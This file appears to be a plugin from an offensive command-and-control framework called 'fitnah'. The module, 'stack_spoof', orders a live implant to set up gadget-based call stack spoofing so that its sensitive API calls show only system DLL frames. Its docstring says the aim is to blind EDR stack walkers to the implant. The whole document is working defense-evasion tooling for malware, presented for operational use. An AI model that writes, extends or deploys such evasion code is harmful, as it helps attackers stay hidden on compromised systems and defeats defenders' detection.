"""defense_evasion/stack_spoof — enable/verify gadget-based call stack spoofing. MITRE T1036

Triggers SpoofInit() in the implant which scans ntdll/kernelbase for a jmp [r11] gadget.
Once initialized, all sensitive API calls dispatched via SpoofCall() show only system DLL
frames in the call stack — EDR stack walkers cannot see the implant's return address.
"""
from fitnah.sdk import BasePlugin, ModuleResult, ParamSchema, mitre


class StackSpoof(BasePlugin):
    NAME        = "stack_spoof"
    DESCRIPTION = "Initialize gadget-based call stack spoofing in implant (SpoofInit). No PowerShell."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1036"
    CATEGORY    = "defense_evasion"
    schema      = ParamSchema()

    @mitre("T1036")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")
        r = ctx.send("spoof_init", {})
        if r["status"] != "ok":
            return ModuleResult.err(f"spoof_init failed: {r['output']}")
        return ModuleResult.ok(data=r["output"] or "Stack spoof gadget initialized — SpoofCall() active")
